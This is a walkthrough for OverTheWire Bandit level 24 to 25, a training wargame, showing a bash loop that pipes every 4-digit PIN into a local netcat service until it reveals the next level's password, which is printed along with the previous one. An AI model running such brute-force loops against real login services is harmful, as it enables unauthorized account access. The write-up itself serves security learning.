# Level 24 - Level 25: Bandit - OverTheWire

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

## Solution


```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
Wrong! Please enter the correct pincode. Try again.

bandit24@bandit:~$ vi /tmp/brute.sh


while true; do
    echo 'lol'
    sleep 1
done | nc -l 9000


#!/bin/bash

for i in {0001..9999}; do
    echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done | nc localhost 30002

bandit24@bandit:~$ chmod 700 /tmp/brute.sh
bandit24@bandit:~$ /tmp/brute.sh

Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.

```